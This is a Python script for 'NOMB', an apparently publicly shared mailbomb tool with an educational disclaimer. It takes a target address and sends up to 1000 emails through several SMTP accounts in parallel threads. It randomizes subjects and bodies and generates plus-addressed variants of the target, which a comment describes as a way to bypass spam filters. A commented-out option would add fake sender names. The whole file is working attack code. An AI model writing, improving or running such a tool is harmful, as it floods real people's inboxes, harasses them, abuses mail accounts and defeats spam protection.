"""
NOMB is a massmail attacker, which helps the security analysis to understand the process of 
massmail and/or mailbomb attack. However using this scripts without the permission of the 
mail owner can be illegal.
Author : Nabil 
Last modified : 29th October, 2024
"""

# importing libs
import smtplib
import random
import string
import re
import json
import sys
import os
from email.mime.text import MIMEText
import threading

# Logo with color to make it look more hehhehehe
logo = r""" _   _  ___  __  __ ____
| \ | |/ _ \|  \/  | __ )
|  \| | | | | |\/| |  _ \
| |\  | |_| | |  | | |_) |
|_| \_|\___/|_|  |_|____/ """

logo_with_color = f"""{"\033[1;33m"}{logo}{"\033[0m"}"""
# General Header
print(f"""{logo_with_color}      [Enjoy the NOMB Experience]""")
print("****************************************************************")
print("*             © Copyright NABIL, 2024                          *")
print("\n*           https://w3nabil.github.io/                         *")
print("****************************************************************")
print(f"{"\033[1;33m"}Caution: The NOMB Script was made for educational and ethical purposes. Misuse against any emails may have legal consequences.{"\033[0m"}")

# Checking if config file exist or not, if not then exit
if not os.path.exists('config.json'):
    print(f"{"\033[31m"}Config file not found, Try running sudo config.py first.{"\033[0m"}")
    sys.exit(1)
else:
    print(f"{"\033[32m"}Found config.json{"\033[0m"}")

# Check if src exist or not, if not then create
if not os.path.exists(os.path.join(os.getcwd(), 'src')):
    try:
        os.makedirs(os.path.join(os.getcwd(), 'src'))
        print(f"{"\033[32m"}Folder 'src' created.{"\033[0m"}")
    except Exception as e:
        print(f"{"\033[31m"}Failed to create 'src' folder, Try creating the folder or run the script with sudo{"\033[0m"}")
        sys.exit(1)
else:
    print(f"{"\033[32m"}Found src folder{"\033[0m"}")

# Showing all the accounts in the config file
print(f"\n\n\t\t{"\033[1;33m"}ACCOUNT/S FOUND IN CONFIG FILE{"\033[0m"}")
print(f"\n\t{"\033[32m"}SL  | \tSMTP Server  | \tSMTP PORT | \tSMTP User")
print(f"\t--------------------------------------------------{"\033[0m"}")
with open("config.json", "r") as f:
    data = json.load(f)
    for i in data:
        print(f"{"\033[32m"} \t{i['sl']} |{"\033[0m"} \t{i['smtp_server']} |\t{i['smtp_port']} | \t{i['smtp_user']}")
    f.close()
print("\n\n")

"""****************************************************************
*                     TARGET EMAIL INPUT                          *
****************************************************************"""

"""Validate Target Email Address."""
def validemail(email):
    # checking email with regex pattern
    if not re.match(r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$', email):
        return True

while True:
    # Asking for target email
    print("Please provide the target email address..")
    targetemail = input(" > ")
    # calling the email validate function
    if validemail(email=targetemail):
        print("Invalid Email Address, Try again!\n")
        continue # not valid, ask again
    break


"""****************************************************************
*                     ATTACK RANGE INPUT                          *
****************************************************************"""

"""Min and max range for the number of mails to send"""
def attackrange_verify():
    if AttackRange <= 0:
        return True
    elif AttackRange > 1000:
        return True
    else:
        return False
# loop for getting the number of mails to send
while True:
    try:
        print("How many mails would you like to send? [Default 100][Min 1 - Max 1000]\n")
        AttackRange = int(input(" > ") or 100)
        if attackrange_verify():
            print("Invalid Input, Please enter a number between 1 and 1000")
            continue
        break
    # if input is not a number, show error
    except ValueError:
        print("Input shouldn't be a string.")
        attack_statement = False
    # if ctrl + c , exit the code without showing any error
    except KeyboardInterrupt:
        print("\n\nExiting...")
        print("Successfully exited.")
        sys.exit(1)

"""****************************************************************
*                        SUBJECT INPUT                            *
****************************************************************"""

while True:
    print("Do you have a custom subject file? [Example = 1 / 2]")
    print(" (1) Yes\n (2) No [Default]")

    try:
        subjectchoice = int(input(" > ") or 2)
        if subjectchoice == int(1):
            while True:
                print("Custom subject file name: [Example: custom_subject]")
                print("Note: The file should be in the src folder, Avoid using any file extension.")
                customsubjectfile = input(" > ")
                if os.path.exists(f'./src/{customsubjectfile}.txt'):
                    print("Found ./src/" + customsubjectfile + ".txt , Using custom subject file")
                    subjectfile = f"{customsubjectfile}.txt"
                    break
                else:
                    print("File not found! Please enter a valid file name.")
                    print("Tips: Check again if the file is in ./src/ folder, if src doesn't exist, create one.you should save the file in a .txt format")
                    continue
            
            break
        elif subjectchoice == int(2):
            print("Please Write down the Subject of the email..")
            mailsubject = input(" > ") or "Who nombed you?"

            with open('./src/mailsubject.txt', 'w') as file:
                for i in range(int(AttackRange)):
                    RanLetters = ''.join(random.choice(string.ascii_letters)for _ in range(6))
                    Subject = f"{mailsubject} [" + RanLetters + "]"
                    file.write(Subject+'\n')
                file.close()
            subjectfile = "mailsubject.txt"
            break
        else:
            print("Invalid Input, Please choice 1 or 2\n")
            continue
    except ValueError:
        print("Input type should be a number.\n")
        continue
    except KeyboardInterrupt:
        print("\n\nExiting...")
        print("Successfully exited...")
        sys.exit(1)

"""****************************************************************
*                         BODY INPUT                              *
****************************************************************"""

while True:
    print("Do you have a custom body file? [Example = 1 / 2]")
    print(" (1) Yes\n (2) No [Default]") 
    try:
        bodychoice = int(input(" > ") or 2)
        if bodychoice == int(1):
            while True:
                print("Please write down filename of the body list you have.. [Example: custom_body]")
                print("Note: The file should be in the src folder, Avoid using any file extension.")
                custombodyfile = input(" > ")
                if os.path.exists(f'./src/{custombodyfile}.txt'):
                    print("Found ./src/" + custombodyfile + ".txt , Using custom subject file")
                    bodyfile = f"{custombodyfile}.txt"
                    break
                else:
                    print("File not found! Please enter a valid file name.")
                    print("Tips: Check again if the file is in ./src/ folder. if src doesn't exist, create one.you should save the file in .txt format")
                    continue
            break
        elif bodychoice == int(2):
            print("Please Write down the Body of the email...")
            mailbody = input(" > ") or "Good morning, hello, good night. September, How are you? Are you going to school? To be honest, I thought school was crap. To those who don't want to go to school tomorrow, don't worry, being an adult is fun."
 
            with open('./src/mailbody.txt', 'w') as file:
                for i in range(int(AttackRange)):
                    RanLetters = ''.join(random.choice(string.ascii_letters)for _ in range(6))
                    Body = f"{mailbody} [" + RanLetters + "]"
                    file.write(Body+'\n')
                file.close()
            bodyfile = "mailbody.txt"
            break
        else:
            print("Invalid Input, Please choice 1 or 2\n")
            continue
    except ValueError:
        print("Input type should be a number.\n")
        continue
    except KeyboardInterrupt:
        print("\n\nExiting...")
        print("Successfully exited...")
        sys.exit(1)

"""****************************************************************
*              SENDER NAME & + String Mail Gen                    *
****************************************************************"""

"""# Uncomment this code if you want to add user name in the mail, but it is not recommended as it can be used for illegal purposes."""
"""
# Sender Name (Plain)
print("Would you like to use fake random names for the sender? [Example = 1 / 2]")
print(" (1) Yes\n (2) No [Default]")
while True:
    try:
        sendernamechoice = int(input(" > ") or 2)
        if sendernamechoice == int(1):
            # Fake Name
            from faker import Faker
            fake = Faker()
            
            with open('./src/mailsender.txt', 'w') as file:
                for i in range(int(AttackRange)):
                    sendername = fake.name()
                    file.write(sendername+'\n')
                file.close()
            break
        elif sendernamechoice == int(2):
            # Sender Name
            print("Please Write down the Sender Name..")
            sendername = input(" > ") or "NOMB"
            break
        else:
            print("Invalid Input, Please choice 1 or 2\n")
            continue
    except ValueError:
        print("Input type should be a number.\n")
        continue
    except KeyboardInterrupt:
        print("\n\nExiting...")
        print("Successfully exited...")
        sys.exit(1) """


"""This email generation with plus string shouldnt be erased or edited, as it is the way to bypass the email spam filter along with different subjects and bodies."""

with open('./src/maillist.txt', 'w') as file:
    email = targetemail.split("@")
    for i in range(int(AttackRange)):
        RanLetters = ''.join(random.choice(string.ascii_letters)for _ in range(6))
        Mail = email[0] + "+" + RanLetters + "@" + email[1]
        file.write(Mail+ '\n')
    file.close()

"""****************************************************************
*                   READ FILES and Config                         *
****************************************************************"""

"""Function for reading files """
def read_file(filepath):
    with open(f"./src/{filepath}.txt", 'r') as file:
        return [line.strip() for line in file.readlines()]

Emails = read_file('maillist.txt')
Subjects = read_file(subjectfile)
Bodies = read_file(bodyfile)
# Senders = read_file('mailsender.txt')

with open("config.json", "r") as f:
    user_data = json.load(f)
    f.close()

"""****************************************************************
*                       SENDING EMAILS                            *
****************************************************************"""

""" Function to send an email """
def send_email(fromname, receiver_email, subject, body, smtp_details):
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = fromname
    msg['To'] = receiver_email

    try:
        with smtplib.SMTP(smtp_details['smtp_server'], smtp_details['smtp_port']) as server:
            server.starttls()
            try:
                server.login(smtp_details['smtp_user'], smtp_details['smtp_password'])
            except Exception as e:
                print(f"{receiver_email} |\t {smtp_details['smtp_user']} |\t LOGIN ISSUES: {e}")
                return

            server.sendmail(smtp_details['smtp_user'], receiver_email, msg.as_string())
            print(f"{receiver_email} |\t {smtp_details['smtp_user']} |\t SENT")
    except Exception as e:
        print(f"{receiver_email} |\t {smtp_details['smtp_user']} |\t FAILED: {e}")

""" Function to send emails using a specific SMTP account """
def send_emails_from_account(smtp_details):
    for i in range(len(Emails)):
        receiver_email = Emails[i]
        subject = Subjects[i % len(Subjects)]
        body = Bodies[i % len(Bodies)]
        fromname = "NOMB" # or Senders[i % len(Senders)] 
        send_email(fromname, receiver_email, subject, body, smtp_details)

"""****************************************************************
*                         Threads                                 *
****************************************************************"""

threads = []
print("    TARGET       |\t        RESPONSIBLE      |\t STATUS")

for smtp in user_data:
    thread = threading.Thread(target=send_emails_from_account, args=(smtp,))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

"""****************************************************************
*                       THE END OF FILE                           *
****************************************************************"""
try:
    os.remove('./src/maillist.txt')
    os.remove('./src/mailsubject.txt')
    os.remove('./src/mailbody.txt')
    # os.remove('./src/mailsender.txt')
    print("Temporary files removed.")
    print("Thank you for using nomb!")
except Exception:
    print("Please wait a moment..")
print("Exiting...")
print("Successfully exited.")